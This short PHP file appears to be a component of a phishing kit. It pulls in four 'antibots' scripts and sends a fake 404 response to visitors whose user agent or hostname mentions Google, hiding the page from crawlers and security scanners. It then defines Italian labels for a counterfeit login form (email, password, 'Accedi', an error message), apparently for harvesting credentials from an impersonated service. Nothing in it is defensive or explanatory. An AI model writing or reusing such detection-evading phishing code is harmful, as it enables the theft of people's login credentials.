<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="Alcuni dati non sono corretti. Riprova.";
$Email= "Indirizzo email";
$Password = "Password";
$dok = "Accedi";
$req1 = "L'indirizzo email è obbligatorio";
$req2 = 'La password è obbligatoria.';
$forgot ="Problemi di accesso?";
$sign = "Registrati";
$checking = "Controllo dati…";
$priva = "Privacy";
$ri8 = "Tutti i diritti riservati";
$legal = "";
// fin connexioon
?>